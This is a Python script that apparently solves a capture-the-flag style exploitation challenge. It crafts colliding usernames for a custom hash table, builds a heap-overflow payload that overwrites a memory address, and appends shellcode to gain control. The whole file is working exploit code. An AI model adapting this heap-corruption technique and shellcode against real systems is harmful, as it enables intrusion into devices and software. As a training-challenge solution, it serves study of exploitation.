import struct
import itertools
import binascii

def hex_to_str(s):
	return " ".join("{:02x}".format(ord(c)) for c in s)
	
def endian(addr):
	return hex_to_str(struct.pack("H",addr))
    
def signed_endian(addr):
	return hex_to_str(struct.pack("h",addr))

def hash(username):
    r14 = username
    r15 = 0
    for i in r14:
      r13 = ord(i)
      r13 += r15
      r15 = r13
      r15 = (r15 << 5) & 0xffff
      r15 = (r15 - r13) & 0xffff
      r15 = r15 % 8
    return r15

def force_bin(username,bin):
    bytes_object = username.replace(" ", "")
    ascii_string = binascii.a2b_hex(bytes_object)
    namehash = hash(ascii_string)
    if(namehash==bin):
        return ""
    for i in range(100):
        namehash = hash(ascii_string+str(i));
        if(bin==namehash):
            return hex_to_str(str(i))
    assert False

def convert_to_command(uname):
    return "new "+uname+" 1;"

def hex_convert_to_command(uname):
    return hex_to_str("new ")+uname+hex_to_str(" 1;")

bin_we_wanna_fill=0
need_unames = 12
unames = []

for i in range(500):
    username = str(i)
    bin = hash(username);
    if(bin==bin_we_wanna_fill):
        unames.append(username)
    if(len(unames) > need_unames):
        break;

results = ""
for i in unames[0:5]:
    results += hex_to_str(convert_to_command(i))

skip = endian(0x503c)+endian(0x515c)
results += hex_convert_to_command( skip+force_bin(skip,0)) #pointer shenanigans

for i in unames[5:9]:
    results += hex_to_str(convert_to_command(i))


write_this = 0x3e60
address_to_overwrite=0x3dce
val_at_overwrite=0x49a2
length = write_this-6-val_at_overwrite 

payload =  hex_to_str("A"*6)
payload += endian(address_to_overwrite-4) 
payload += endian(0x4444) 
payload += signed_endian(length) #please god 

results += hex_convert_to_command( payload+force_bin(payload,0)) #actual hack shenanigans


shell_code = "41" + "30127f00b012ec4c" #41 for alignment

results += hex_convert_to_command(shell_code)#triggers rehash and hence free also hold payload

#results += hex_to_str(convert_to_command(unames[10])) 

print(results)
